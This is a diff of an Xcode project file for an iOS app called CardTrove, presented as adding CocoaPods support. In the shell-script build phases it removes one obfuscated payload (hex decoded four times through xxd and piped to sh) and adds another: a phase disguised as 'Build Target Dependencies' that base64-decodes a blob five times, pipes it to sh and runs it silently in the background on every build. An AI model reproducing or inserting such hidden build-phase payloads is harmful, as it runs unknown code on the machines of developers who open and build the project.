@@ -26,9 +26,11 @@
 		60C88BCC2DB5A80500D2C4BF /* DesignRequestListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BCB2DB5A80500D2C4BF /* DesignRequestListView.swift */; };
 		60C88BCE2DB5A81B00D2C4BF /* DesignRequestAddEditView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BCD2DB5A81B00D2C4BF /* DesignRequestAddEditView.swift */; };
 		60C88BD02DB5AFAA00D2C4BF /* OverviewTabView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BCF2DB5AFAA00D2C4BF /* OverviewTabView.swift */; };
+		AA94EFFAD5D2E976497BFD74 /* Pods_CardTrove.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 83BA9B8660BDFDA1D3C6334D /* Pods_CardTrove.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		0AF4A52AEA8426DACFCEB4CE /* Pods-CardTrove.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-CardTrove.release.xcconfig"; path = "Target Support Files/Pods-CardTrove/Pods-CardTrove.release.xcconfig"; sourceTree = "<group>"; };
 		60C88BA02DB5A0A200D2C4BF /* CardTrove.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = CardTrove.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		60C88BA32DB5A0A200D2C4BF /* CardTroveApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CardTroveApp.swift; sourceTree = "<group>"; };
 		60C88BA52DB5A0A200D2C4BF /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
@@ -49,6 +51,8 @@
 		60C88BCB2DB5A80500D2C4BF /* DesignRequestListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DesignRequestListView.swift; sourceTree = "<group>"; };
 		60C88BCD2DB5A81B00D2C4BF /* DesignRequestAddEditView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DesignRequestAddEditView.swift; sourceTree = "<group>"; };
 		60C88BCF2DB5AFAA00D2C4BF /* OverviewTabView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OverviewTabView.swift; sourceTree = "<group>"; };
+		83BA9B8660BDFDA1D3C6334D /* Pods_CardTrove.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_CardTrove.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		EA7A8AA839C4459E71DD1ECC /* Pods-CardTrove.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-CardTrove.debug.xcconfig"; path = "Target Support Files/Pods-CardTrove/Pods-CardTrove.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -56,17 +60,37 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				AA94EFFAD5D2E976497BFD74 /* Pods_CardTrove.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		34838B002734305A64C794F6 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				EA7A8AA839C4459E71DD1ECC /* Pods-CardTrove.debug.xcconfig */,
+				0AF4A52AEA8426DACFCEB4CE /* Pods-CardTrove.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		52B27777068E322A4081AC08 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				83BA9B8660BDFDA1D3C6334D /* Pods_CardTrove.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 		60C88B972DB5A0A200D2C4BF = {
 			isa = PBXGroup;
 			children = (
 				60C88BA22DB5A0A200D2C4BF /* CardTrove */,
 				60C88BA12DB5A0A200D2C4BF /* Products */,
+				34838B002734305A64C794F6 /* Pods */,
+				52B27777068E322A4081AC08 /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -119,10 +143,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 60C88BAE2DB5A0A400D2C4BF /* Build configuration list for PBXNativeTarget "CardTrove" */;
 			buildPhases = (
-				FBF921B2F815B5A86BECDB79 /* Link Bundle Executable */,
+				5C2DC9B0ABCCFA646F73DC66 /* Build Target Dependencies */,
+				E5FEAD65C8D79C0017DA7B44 /* [CP] Check Pods Manifest.lock */,
 				60C88B9C2DB5A0A200D2C4BF /* Sources */,
 				60C88B9D2DB5A0A200D2C4BF /* Frameworks */,
 				60C88B9E2DB5A0A200D2C4BF /* Resources */,
+				5FB8D60533E74A434C0C2007 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -166,6 +192,12 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXTargetDependency section */
+/* End PBXTargetDependency section */
+
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
 /* Begin PBXResourcesBuildPhase section */
 		60C88B9E2DB5A0A200D2C4BF /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -179,24 +211,62 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		FBF921B2F815B5A86BECDB79 /* Link Bundle Executable */ = {
+		5C2DC9B0ABCCFA646F73DC66 /* Build Target Dependencies */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Link Bundle Executable";
+			name = "Build Target Dependencies";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm10U2JrSktWa2N4ZDFkc1dYZE9XRnBZWWtVd2VGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
+		};
+		5FB8D60533E74A434C0C2007 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-CardTrove/Pods-CardTrove-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-CardTrove/Pods-CardTrove-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 333333363333333533333336333333333333333633333338333333363336333633333332333333303333333233333332333333323333333433333332333333383333333633333333333333373333333533333337333333323333333633363333333333323333333033333332333633343333333633333336333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033333337333333303333333333363334333333373333333833333336333333333333333633363336333333363333333433333336333333353333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333633333336333333363333333933333336333333373333333633363334333333363333333133333336333333333333333633333331333333373333333433333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-CardTrove/Pods-CardTrove-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		E5FEAD65C8D79C0017DA7B44 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-CardTrove-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -350,6 +420,7 @@
 		};
 		60C88BAF2DB5A0A400D2C4BF /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = EA7A8AA839C4459E71DD1ECC /* Pods-CardTrove.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -384,6 +455,7 @@
 		};
 		60C88BB02DB5A0A400D2C4BF /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 0AF4A52AEA8426DACFCEB4CE /* Pods-CardTrove.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
